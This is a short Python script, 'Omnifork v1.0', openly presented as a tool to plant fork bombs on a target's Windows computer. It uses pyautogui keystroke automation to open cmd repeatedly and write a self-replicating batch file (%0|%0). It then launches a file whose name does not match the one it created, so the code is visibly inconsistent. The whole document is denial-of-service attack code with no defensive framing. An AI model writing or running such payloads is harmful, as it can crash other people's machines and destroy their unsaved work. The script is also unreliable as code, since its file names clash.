# Omnifork v1.0
# A small tool to open dozens of fork bombs on the target's computer

import pyautogui     # Make sure you have me! If not, do pip install pyautogui
import time

BOMBS_TO_PLACE = 3     # Replace me with the amount of bombs to place
DELAY_IN_SECS = 0.2    # Replace me with the time to wait before typing in the CMD.

for i in range(BOMBS_TO_PLACE):
    pyautogui.hotkey("winleft", "r")
        
    pyautogui.typewrite("cmd")
    pyautogui.press("enter")
    time.sleep(DELAY_IN_SECS)

    pyautogui.typewrite("echo  %0^|%0  > omnifork.bat")
    pyautogui.press("enter")

    pyautogui.typewrite("forkbomb.bat")
    pyautogui.press("enter")
    
